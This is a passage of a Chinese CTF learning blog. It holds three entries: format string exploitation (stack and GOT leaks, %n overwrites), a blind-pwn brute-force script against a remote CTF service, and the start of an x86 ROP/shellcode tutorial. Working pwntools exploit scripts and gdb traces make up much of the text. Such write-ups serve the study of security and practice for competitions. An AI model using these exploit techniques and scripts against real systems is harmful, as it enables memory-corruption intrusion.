punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0x80484f9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+115<span class="token operator">></span>:    add    esp,0x10<span class="token punctuation">)</span> //第二次调用，返回地址0004<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>  //函参10008<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>  // 2   （格式化参数1。。。）0012<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span>    //30016<span class="token operator">|</span> 0xffffcfcc --<span class="token operator">></span> 0x804849d <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+23<span class="token operator">></span>:    add    ebx,0x1b63<span class="token punctuation">)</span>   //40020<span class="token operator">|</span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfd4 --<span class="token operator">></span> 0x0 0028<span class="token operator">|</span> 0xffffcfd8 --<span class="token operator">></span> 0xf7ffd940 --<span class="token operator">></span> 0x0 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ 以此判断程序将输出0x804849d：gdb-peda$ cContinuing.804849d<span class="token punctuation">[</span>Inferior 1 <span class="token punctuation">(</span>process 9897<span class="token punctuation">)</span> exited normally<span class="token punctuation">]</span></code></pre><p>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</p><p>小结：</p><pre><code>    利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。    利用 %s 来获取变量所对应地址的内容，只不过有零截断。    利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</code></pre><p>3：泄露任意地址内存<br>有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了</p><p>一般来说我们所读取的变量值都是在栈上的，因为是某个函数的局部变量。</p><p>由于我们可以控制格式化字符串，如果我们知道输出函数调用时我们的格式化字符串是第几个参数就可以构造特定形式来获取某些addr，如：p32（addr）%K$s<br>我们可以用下面的方法确定参数偏移：<br>[tag]%p%p%p%p%p%p…</p><p>如：</p><pre class=" language-bash"><code class="language-bash">AAAA%p%p%p%p%p%p%p%p00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%pAAAA0xff99da800xf7f814100x804849d0x414141410x702570250x702570250x702570250x70257025</code></pre><p>所以得到参数位置是5，是格式化字符串的第4个参数</p><p>现在我们可以来访问某些函数的地址如scanf函数，首先找到其got地址<br>利用pwntools得：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>scanf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>scanf_got<span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>scanf_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%4$s'</span><span class="token keyword">print</span> payloadgdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>   <span class="token operator">//</span>进一步调试sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"%4$s\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>在脚本启动gdb后先finih直到main函数然后在printf下断点。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">=</span><span class="token operator">></span> 0xf7e25b60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f09c79   0xf7e25b65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e25b6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e25b6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e25b73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffefdd2c --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    add    esp,0x20<span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffefdd30 --<span class="token operator">></span> 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffefdd34 --<span class="token operator">></span> 0x1 0012<span class="token operator">|</span> 0xffefdd38 <span class="token punctuation">(</span><span class="token string">"\"\"\"\"\377\377\377\377P\335\357\377P\335\357\377\020t\374\367\235\204\004\b\024\240\004\b%4<span class="token variable">$s</span>"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffefdd3c --<span class="token operator">></span> 0xffffffff 0020<span class="token operator">|</span> 0xffefdd40 --<span class="token operator">></span> 0xffefdd50 --<span class="token operator">></span> 0x804a014 --<span class="token operator">></span> 0xf7e38410 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__isoc99_scanf<span class="token operator">></span>:    push   ebp<span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffefdd44 --<span class="token operator">></span> 0xffefdd50 --<span class="token operator">></span> 0x804a014 --<span class="token operator">></span> 0xf7e38410 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__isoc99_scanf<span class="token operator">></span>:    push   ebp<span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffefdd48 --<span class="token operator">></span> 0xf7fc7410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e25b60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ 可以看到第4个参数确实是scanf的在libc库中的地址在调试结束后的terminal可以得到scanf的地址：0x804a014\x14\x04%4<span class="token variable">$s</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> running <span class="token keyword">in</span> new terminal: /usr/bin/gdb -q  <span class="token string">"./test1"</span> 11351 -x <span class="token string">"/tmp/pwn7ki8h7.gdb"</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> debugger: Done0xf7d5e410<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./test1'</span> stopped with <span class="token keyword">exit</span> code 0 <span class="token punctuation">(</span>pid 11351<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><p>有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字(32位4，64位8）长整数倍的地址处，一般来说，类似于下面的这个样子。<br>[padding][addr][padding]</p><p>4：内存覆盖<br>只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值：%n,<br>%n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</p><p>程序：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>基本构造格式如下：<br>…[overwrite addr]….%[overwrite offset]$n<br>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数<br>步骤：<br>    确定覆盖地址<br>    确定相对偏移<br>    进行覆盖</p><p>确定覆盖地址：首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p><p>确定相对偏移：其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()<br>hunter@hunter:~/PWN/formal/wiki$ ./test2<br>0xffebe8ac<br>AAAA%p%p%p%p%p%p%p%p%p<br>AAAA0xffebe8480xf7ef14100x80484bd(nil)0x10x414141410x702570250x702570250x70257025<br>所以是第7 个参数  =》  n为6</p><p>进行覆盖：<br>将c的地址放在n=6，然后利用%n来修改c的值<br>[addr of c]%012d%6$n    //addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p><p><strong>注意：如果地址没有在或者不能放在第一个位置时，要注意我们的地址作为printf的参数是第几个</strong><br><img src="https://s1.ax1x.com/2020/07/05/USf2tO.png" alt=""></p><p>Exp：</p><pre class=" language-python"><code class="language-python">    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">)</span>    c_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#drop ：是否保留</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span>    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%012d'</span> <span class="token operator">+</span> <span class="token string">'%6$n'</span>    <span class="token keyword">print</span> payload    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>覆盖小数字：<br>下面的问题是将a改为2  因为a是全局变量，在data段地址可从ida获取<br>这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。  （或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。）</p><p>我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是：aa%k$naa  刚好占8字节所以我们的地址被挤到第n=8个参数</p><p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p><p>.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh</p><p>故而我们可以构造如下的利用代码</p><pre class=" language-python"><code class="language-python">    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">)</span>    a_addr <span class="token operator">=</span> <span class="token number">0x0804A024</span>    payload <span class="token operator">=</span> <span class="token string">'aa%8$naa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>a_addr<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p><p>覆盖大数字<br>我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12</p><p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。</p><p>.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r</p><p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><p>0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12</p><p>这里将构造一个推算代码：（本人不懂）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span></code></pre><pre><code>offset 表示要覆盖的地址最初的偏移size 表示机器字长addr 表示将要覆盖的地址。target 表示我们要覆盖为的目的变量值。</code></pre><p>这其实就是pwntools的一个模块：当要写入很大的数时可以用pwntools的fmtstr模块：我们希望向0x08048000写入值0x10203040，在pwntools里，我们可以用命令fmtstr_payload。<br>payload = fmtstr_payload(6,{0x08048000:0x10203040}) // 即可 ， 6是偏移量。</p><p>详情:<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf进阶-pwn-warmup</title>
      <link href="/2020/05/16/xctf-jin-jie-pwn-warmup/"/>
      <url>/2020/05/16/xctf-jin-jie-pwn-warmup/</url>
      
        <content type="html"><![CDATA[<p>这个提没有附件，被称为盲打，blind pwn<br><img src="https://s1.ax1x.com/2020/05/23/YjvFy9.png" alt=""></p><p>黑箱测试之类的。</p><p>linux连接尝试：<br><img src="https://s1.ax1x.com/2020/05/23/YjviQJ.png" alt=""></p><p>因为没有关键提示，可以从溢出方面下手，这个地址很可能就是后门。</p><p>exp爆破：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>addr <span class="token operator">=</span> <span class="token number">0x40060d</span>    <span class="token comment" spellcheck="true">#地址可能是p32 也可能是p64</span><span class="token keyword">def</span> <span class="token function">fuzz</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> num<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#爆破函数 , flag表示有3种可能：p32发送后门，p64发送后门，无效后门。</span>    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> num    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.200.240.241"</span><span class="token punctuation">,</span> <span class="token number">7000</span><span class="token punctuation">)</span>                fuzz<span class="token punctuation">(</span>r<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>                text <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'text.len='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'text='</span><span class="token operator">+</span>text<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'num='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' flag='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>                r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#except为空则try语句中出现任何错误都会执行r.close()</span>                r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>对于循环脚本可用ctr + c 打断无法继续下去的一个循环进行下一个循环</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP_x86</title>
      <link href="/2020/04/23/rop-x86/"/>
      <url>/2020/04/23/rop-x86/</url>
      
        <content type="html"><![CDATA[<h2 id="ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"><a href="#ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。" class="headerlink" title="ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"></a>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</h2><h3 id="Control-Flow-Hijack-程序流劫持"><a href="#Control-Flow-Hijack-程序流劫持" class="headerlink" title="Control Flow Hijack 程序流劫持"></a>Control Flow Hijack 程序流劫持</h3><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p><p>level1：无防护32位<br>ida伪代码：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p><p>进入vulnerable（危险）函数：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p><p>从char buf （后面的注释）这一段可知其大小大概为0x88+0x10.<br>下面的read函数256u表示允许读入256个字符，显然存在溢出。<br>进入buf：<br><img src="https://s1.ax1x.com/2020/05/23/YvkNbF.png" alt=""><br>所以（下面的没截下来）buf可放入0x88+0x8个字符（140），还可以通过调试进一步验证。</p><h3 id="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"><a href="#那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。" class="headerlink" title="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"></a>那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。</h3><h2 id="调试："><a href="#调试：" class="headerlink" title="调试："></a>调试：</h2><p>在read函数时制造200个字符：<br><img src="https://s1.ax1x.com/2020/05/23/Yvksv6.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/23/YvkdUJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/23/YvkWUH.png" alt=""><br>所以140个字符+ret返回地址即可</p><h3 id="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"><a href="#现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）" class="headerlink" title="现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）"></a>现在的问题就是找到这个buf的首地址（按照计划shellcode就在首地址）</h3><p>由于各种玄学问题buf正真的地址不是我想的那样，这里我引用蒸米@阿里聚安全的原话：</p><pre><code>  对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。</code></pre><p>解决方法：开启core dump功能。<br>指令：ulimit -c unlimited<br>   sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’</p><p>开启后，当运行程序出现内存错误时，系统会生成一个core dump文件在tmp目录下。然后我们用gdb查看该core文件，来推测buf真正的地址。</p><p><img src="https://s1.ax1x.com/2020/05/23/YvkRVe.png" alt=""><br>接下来调试core文件：<br><img src="https://s1.ax1x.com/2020/05/23/Yvk4PA.png" alt=""><br>下面这一步我不太明白为啥是$esp-144得到buf地址。个人觉得应该是-140，如果不正确可以扩大范围<br><img src="https://s1.ax1x.com/2020/05/23/Yvkf5d.png" alt=""><br>将这里的字符串和我们之前造的字符串对比是一致的。所以可以知道我们输入的字符串放在0xffffd000这里。所以buf地址就是0xffffd000.可以写exp了。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#level1</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level1"</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> endian<span class="token operator">=</span><span class="token 